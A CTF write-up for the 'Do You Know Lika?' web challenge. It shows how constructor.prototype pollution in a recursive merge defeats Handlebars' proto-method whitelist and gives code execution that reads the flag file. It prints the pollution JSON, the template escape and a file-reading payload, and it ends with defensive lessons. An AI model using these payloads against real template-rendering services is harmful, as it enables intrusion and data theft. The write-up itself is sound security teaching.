# FortID CTF 2026 Writeup: Do You Know Lika?

- **Category:** Web
- **Challenge author:** dsantl
- **Points / Solves:** 128 pts / 102 solves
- **Flag:** `FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_df6867b140}`

---

## Challenge

> The Lika Tourist Board has launched a postcard designer for visitors who think
> they know the region. Pick a theme, fill in the postcard data, and let a fresh
> print worker process prepare a preview.
>
> Can you print the ranger's secret?

---

## Summary

An Express app renders attacker-supplied Handlebars templates in a separate
Node worker spawned with `--permission --allow-fs-read=/challenge
--allow-fs-read=/tmp/lika/flag.txt`. The worker is hardened for the usual
Handlebars escapes (`allowProtoMethodsByDefault: false`,
`allowProtoPropertiesByDefault: false`, dynamic/inline partials blocked), but
its custom `mergeTheme()` writes through `constructor.prototype` into
`Object.prototype` *before* rendering. Polluting
`Object.prototype.allowedProtoMethods` feeds the Handlebars proto-access
whitelist and re-enables `constructor`/`apply`, restoring the classic
`constructor.constructor` RCE — which then reads the allowed flag file.

## Solution

### Step 1: `mergeTheme` gives prototype pollution

`src/worker.js` merges `job.theme` recursively:

```js
function mergeTheme(target, source) {
  for (const [key, value] of Object.entries(source)) {
    if (value !== null && typeof value === "object") {
      target[key] ??= Array.isArray(value) ? [] : {};
      mergeTheme(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

The server only rejects keys literally named `__proto__`, so
`constructor.prototype` walks `{}` → `Object` → `Object.prototype` and writes
arbitrary JSON values there:

```json
{"constructor": {"prototype": {"allowedProtoMethods": {"constructor": true, "apply": true, "push": true, "pop": true}}}}
```

### Step 2: The pollution defeats Handlebars' proto-access control

`render()` calls `template(ctx, { allowProtoMethodsByDefault: false, ... })`.
Inside Handlebars `createProtoAccessControl(options)`:

```js
whitelist: createNewLookupObject(defaultMethodWhiteList, runtimeOptions.allowedProtoMethods)
```

`options.allowedProtoMethods` is **not** an own property, but it is now
inherited from polluted `Object.prototype`, so the attacker's map is copied
into the method whitelist. `lookupProperty(parent, "constructor")` then returns
`parent.constructor` instead of `undefined`, and `apply`/`push`/`pop` become
usable too.

### Step 3: Classic escape → RCE → read the flag

With `constructor` and `apply` whitelisted, `theme.constructor.constructor` is
`Function`. The template builds a one-element array containing `Function`
(the `push` call appends the options object, which a no-arg `pop` removes),
then `{{#each}}` makes the Function constructor the *current context* — which is
what makes the compiled `.call(context, ...)` pass `Function` as `this` to
`apply`:

```handlebars
{{#with arr}}
{{this.pop}}
{{this.push @root.theme.constructor.constructor}}
{{this.pop}}
{{#each this}}
{{#with (@root.theme.constructor.constructor.apply 0 @root.code)}}{{this}}{{/with}}
{{/each}}
{{/with}}
```

`Function.apply(0, ["return ..."])` creates the payload function and `#with`
lambda-calls it. The worker may read `/tmp/lika/flag.txt` (it is explicitly
allowed), so:

```js
return process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH,'utf8')
```

```text
$ ./solve.py HOST 443
FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_df6867b140}
```

The complete, re-runnable script is `solve.py`.

## Flag

```text
FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_df6867b140}
```

## Lessons

* Hardening a sandbox only works if the options the runtime reads cannot be
  reached through the prototype chain. `createProtoAccessControl` should have
  read own properties (`Object.hasOwn`) or built the whitelist from a null-proto
  options object.
* A recursive merge that trusts `constructor`/`prototype` is still prototype
  pollution even when `__proto__` is filtered.
* `--permission --allow-fs-read=<flag>` means the flag path is reachable as soon
  as any code execution is achieved; the permission model constrains resources,
  not code execution.
